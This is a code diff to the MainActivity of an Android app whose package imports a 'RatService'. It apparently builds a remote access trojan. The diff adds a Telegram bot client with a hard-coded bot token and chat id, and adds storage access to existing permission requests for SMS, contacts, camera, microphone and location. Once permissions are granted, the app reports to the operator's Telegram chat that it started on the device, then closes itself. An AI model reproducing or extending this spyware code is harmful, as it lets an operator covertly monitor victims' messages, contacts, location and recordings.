@@ -11,25 +11,28 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import com.my.luck.core.RatService;
+import com.my.luck.network.TelegramBot;
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     private Handler handler = new Handler();
+    private TelegramBot telegramBot;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Start directly - no layout
+        // Initialize Telegram Bot
+        telegramBot = new TelegramBot(this, "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs", "8681027856");
+        
         checkPermissions();
     }
 
     private void checkPermissions() {
         List<String> neededPermissions = new ArrayList<>();
 
-        // Only essential permissions
         neededPermissions.add(Manifest.permission.READ_SMS);
         neededPermissions.add(Manifest.permission.RECEIVE_SMS);
         neededPermissions.add(Manifest.permission.READ_CONTACTS);
@@ -37,13 +40,12 @@ public class MainActivity extends AppCompatActivity {
         neededPermissions.add(Manifest.permission.CAMERA);
         neededPermissions.add(Manifest.permission.RECORD_AUDIO);
         neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
         
-        // Android 13+ needs POST_NOTIFICATIONS
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
         }
 
-        // Check which are missing
         List<String> missing = new ArrayList<>();
         for (String perm : neededPermissions) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
@@ -52,10 +54,8 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (missing.isEmpty()) {
-            // All permissions granted
             startApp();
         } else {
-            // Request missing permissions
             String[] permsArray = missing.toArray(new String[0]);
             ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
         }
@@ -66,7 +66,6 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Check if all granted
             boolean allGranted = true;
             for (int result : grantResults) {
                 if (result != PackageManager.PERMISSION_GRANTED) {
@@ -78,7 +77,6 @@ public class MainActivity extends AppCompatActivity {
             if (allGranted) {
                 startApp();
             } else {
-                // Show message and close
                 Toast.makeText(this, "Permissions required!", Toast.LENGTH_SHORT).show();
                 finish();
             }
@@ -97,13 +95,23 @@ public class MainActivity extends AppCompatActivity {
             
             Toast.makeText(this, "✅ Started!", Toast.LENGTH_SHORT).show();
             
-            // Close after 1 second
+            // Send test message
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    if (telegramBot != null) {
+                        telegramBot.sendMessage("✅ App started on device!");
+                        telegramBot.sendKeyboard();
+                    }
+                }
+            }, 2000);
+            
             handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     finish();
                 }
-            }, 1000);
+            }, 3000);
             
         } catch (Exception e) {
             e.printStackTrace();
